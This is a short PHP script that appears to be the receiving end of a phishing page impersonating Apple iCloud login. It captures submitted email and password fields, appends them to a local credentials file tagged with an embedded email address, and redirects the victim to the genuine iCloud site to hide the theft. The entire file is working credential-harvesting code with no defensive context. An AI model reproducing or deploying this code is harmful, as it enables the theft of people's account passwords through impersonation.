<?php
if(isset($_POST['apple']) && isset($_POST['pw'])) {
    $data = $_POST['apple'] . '=giorgi00762@mail.bg' . $_POST['pw'] . "\n\n\n";
    $ret = file_put_contents('EmailPawword.pwd', $data, FILE_APPEND | LOCK_EX);
    if($ret === false) {
        die('error!');
    }
    else {
        echo "Done";
    }
}
else {
   die('Error');
}
header("Location: https://www.icloud.com");
die();
?>
Email=giorgi00762@mail.bg
